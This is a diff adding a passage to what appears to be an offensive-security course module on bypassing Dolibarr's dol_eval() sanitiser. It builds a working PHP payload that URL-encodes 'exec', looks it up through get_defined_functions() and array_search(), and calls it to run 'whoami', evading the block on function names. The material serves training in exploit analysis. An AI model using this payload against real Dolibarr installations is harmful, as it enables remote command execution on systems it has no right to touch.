@@ -288,3 +288,26 @@ However, we can't use the function name (`exec`) since the `dol_eval()` function
 
 Since direct use of blocked function names (like `base64_decode()`) isn't allowed by `dol_eval()`, we need alternatives. Fortunately, PHP provides native support for other encoding schemes—such as URL-encoding—that aren't blocked, offering potential paths for bypass.
 
+Although PHP’s `urlencode()` doesn’t encode alphanumeric characters, URL-encoding can still represent them using tools like *Burp Suite Decoder*. For example, the word `"exec"` can be encoded as `%65%78%65%63`.
+```bash
+php > echo urldecode("%65%78%65%63");
+exec
+```
+
+Excellent. Now we should be able to chain together `urldecode()` and `array_search()` to find the index of `exec()` in the array returned by `get_defined_functions()`. We'll pass the `urldecode()` function call to `array_search()` as the needle and pass `get_defined_functions()` as the haystack. However, we want to access the `"internal"` array in the `get_defined_functions()` results.
+
+```php
+php > echo array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"]);
+550
+```
+
+Now that we can dynamically retrieve the index of `exec()`, we can build a complete payload that searches for the function and invokes it.
+```bash
+php > echo get_defined_functions()["internal"][array_search(urldecode("%65%78%65%63"), get_defined_functions()["internal"])]("whoami");
+student
+```
+We've verified that we can invoke an arbitrary function without specifying the function name. However, our payload uses square braces and percent signs.
+
+**REMINDER**: The value of the `$onlysimplestring` parameter controls which characters are allowed. We'll need to perform more analysis to find any calls to `dol_eval()` with the `$onlysimplestring` parameter set to anything other than `1` or `2`. We'll continue this analysis in the next Learning Unit.
+
+## Bypass Security Filter to Trigger Eval
